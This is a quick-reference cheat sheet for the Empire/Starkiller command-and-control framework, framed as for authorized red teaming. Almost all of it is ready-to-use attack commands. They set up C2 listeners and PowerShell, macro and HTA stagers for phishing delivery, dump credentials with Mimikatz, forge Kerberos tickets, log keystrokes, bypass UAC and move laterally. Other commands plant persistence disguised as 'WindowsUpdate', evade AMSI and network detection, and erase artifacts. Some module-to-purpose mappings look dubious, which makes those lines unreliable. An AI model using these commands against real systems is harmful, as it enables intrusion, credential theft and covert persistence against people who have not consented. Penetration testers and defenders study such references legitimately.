# Empire/Starkiller Framework Quick Reference

> **For authorized penetration testing and red team exercises only.**

---

## Installation & Setup

### Empire Installation
```bash
# Install Empire
git clone https://github.com/EmpireProject/Empire.git
cd Empire
./setup/install.sh

# Start Empire
./empire

# Or with Docker
docker run -it empireproject/empire
```

### Starkiller (GUI) Installation
```bash
# Download from releases
wget https://github.com/BC-SECURITY/Starkiller/releases/latest/download/starkiller-linux

# Start Starkiller
./starkiller-linux

# Default: http://localhost:1337
```

---

## Basic Empire Commands

### Core Commands
```bash
# Help
help
help <module>

# List agents
agents
list agents

# Use agent
interact <agent_name>
useagent <agent_name>

# Agent commands
back                         # Return to main menu
exit                         # Exit Empire
```

### Listeners
```bash
# List listeners
listeners
uselistener <type>

# HTTP listener
uselistener http
set Host http://192.168.1.100:8080
set Port 8080
execute

# HTTPS listener
uselistener https
set Host https://192.168.1.100:8443
set CertPath /path/to/cert.pem
execute

# Redirector listener
uselistener redirector
set DefaultProfile /admin/get.php,/news.asp,/login/process.jsp
execute
```

### Stagers
```bash
# List stagers
stagers
usestager <type>

# Windows launcher
usestager windows/launcher_bat
set Listener http
generate

# PowerShell stager
usestager windows/launcher_powershell
set Listener http
set Base64 false
generate

# Macro stager
usestager windows/macro
set Listener http
generate

# HTA stager
usestager windows/hta
set Listener http
generate
```

---

## Agent Management

### Agent Commands
```bash
# Agent information
info                         # Agent details
sysinfo                      # System information

# File operations
ls                          # List files
cd <path>                   # Change directory
download <file>             # Download file
upload <local> <remote>     # Upload file

# Process operations
ps                          # Process list
psinject <pid> <listener>   # Process injection
kill <pid>                  # Kill process

# Network operations
ipconfig                    # Network config
arp                        # ARP table
route                      # Routing table
netview                    # Network shares
```

### Agent Control
```bash
# Shell access
shell <command>             # Execute shell command
powershell <command>        # Execute PowerShell
python <command>            # Execute Python (Linux/macOS)

# Sleep and jitter
sleep <seconds> [jitter%]   # Set sleep interval
sleep 60 20                 # 60 seconds with 20% jitter

# Kill agent
kill                        # Kill current agent
agents remove <agent>       # Remove dead agent
```

---

## Modules

### Reconnaissance Modules
```bash
# System enumeration
usemodule situational_awareness/host/winenum
usemodule situational_awareness/host/computerdetails

# Network enumeration
usemodule situational_awareness/network/bloodhound
usemodule situational_awareness/network/powerview/get_domain_user

# Service enumeration
usemodule situational_awareness/network/portscan
usemodule situational_awareness/network/reverse_dns
```

### Credential Modules
```bash
# Credential harvesting
usemodule credentials/mimikatz/logonpasswords
usemodule credentials/mimikatz/sam
usemodule credentials/mimikatz/lsadump

# Kerberos attacks
usemodule credentials/mimikatz/golden_ticket
usemodule credentials/mimikatz/silver_ticket
usemodule credentials/mimikatz/dcsync_hashdump

# Browser credentials
usemodule collection/browser_data
usemodule collection/ChromeDump
```

### Lateral Movement
```bash
# WMI execution
usemodule lateral_movement/invoke_wmi
set ComputerName target.domain.com
set UserName administrator
set Password password123

# PSExec
usemodule lateral_movement/invoke_psexec
set ComputerName target.domain.com

# SSH (Linux/macOS)
usemodule lateral_movement/invoke_ssh
set ComputerName 192.168.1.100
set UserName root
```

### Privilege Escalation
```bash
# UAC bypass
usemodule privesc/bypassuac_env
usemodule privesc/bypassuac_eventvwr
usemodule privesc/bypassuac_fodhelper

# Token manipulation
usemodule privesc/getsystem
usemodule privesc/ask

# Service escalation
usemodule privesc/powerup/allchecks
usemodule privesc/powerup/service_exe_hijack
```

### Persistence
```bash
# Registry persistence
usemodule persistence/userland/registry
set KeyName Updater
set ADSPath C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

# Scheduled task
usemodule persistence/elevated/schtasks
set TaskName WindowsUpdate
set DailyTime 09:00

# WMI persistence
usemodule persistence/elevated/wmi
set SubName Cleanup
```

### Collection
```bash
# Screenshot
usemodule collection/screenshot

# Keylogger
usemodule collection/keylogger
set Sleep 5

# Clipboard monitor
usemodule collection/clipboardmonitor

# File collection
usemodule collection/find_interesting_files
set Path C:\Users\
```

---

## PowerShell Empire Specific

### PowerShell Modules
```bash
# PowerView
usemodule situational_awareness/network/powerview/get_domain_controller
usemodule situational_awareness/network/powerview/find_localadmin_access

# PowerUp
usemodule privesc/powerup/allchecks
usemodule privesc/powerup/write_dllhijacker

# Invoke-Mimikatz
usemodule credentials/mimikatz/logonpasswords
usemodule credentials/mimikatz/cache
```

### Bypasses
```bash
# AMSI bypass
usemodule management/invoke_script
set ScriptPath /opt/Empire/data/module_source/management/Invoke-PSInject.ps1

# Execution policy bypass
usemodule management/spawn
set Listener http
```

---

## Starkiller GUI Operations

### Navigation
```
Dashboard                   # Overview
Listeners                   # Manage listeners
Stagers                     # Generate stagers
Agents                      # Agent management
Modules                     # Browse modules
Credentials                 # Credential store
Downloads                   # File downloads
Reporting                   # Generate reports
```

### Agent Interaction
```
Right-click agent -> Interact
- Execute Shell Command
- Execute Module
- View Agent Details
- Kill Agent
- Sleep Configuration
```

---

## OPSEC Considerations

### Traffic Shaping
```bash
# Custom profiles
set DefaultProfile /admin/get.php,/news.asp,/login/process.jsp
set UserAgent Mozilla/5.0 (Windows NT 10.0; Win64; x64)

# HTTPS with valid certificates
set CertPath /path/to/valid-cert.pem
set Host https://legitimate-domain.com
```

### Process Migration
```bash
# Migrate to trusted process
ps
psinject <trusted_pid> http
```

### Cleanup
```bash
# Remove artifacts
shell del C:\Windows\Temp\empire.ps1
shell schtasks /delete /tn "WindowsUpdate" /f
shell reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /f
```

---

## Common Workflows

### Initial Access
```bash
1. Create listener: uselistener http
2. Generate stager: usestager windows/launcher_powershell
3. Deliver payload via phishing/web/etc
4. Interact with agent: interact <agent>
```

### Privilege Escalation
```bash
1. Enumerate: usemodule privesc/powerup/allchecks
2. Attempt bypass: usemodule privesc/bypassuac_fodhelper
3. Get SYSTEM: usemodule privesc/getsystem
```

### Lateral Movement
```bash
1. Enumerate domain: usemodule situational_awareness/network/powerview/get_domain_user
2. Find targets: usemodule situational_awareness/network/powerview/find_localadmin_access
3. Move laterally: usemodule lateral_movement/invoke_psexec
```

### Persistence
```bash
1. Registry: usemodule persistence/userland/registry
2. Scheduled task: usemodule persistence/elevated/schtasks
3. WMI: usemodule persistence/elevated/wmi
```

---

*Empire/Starkiller is open source. Ensure proper authorization for all testing activities.*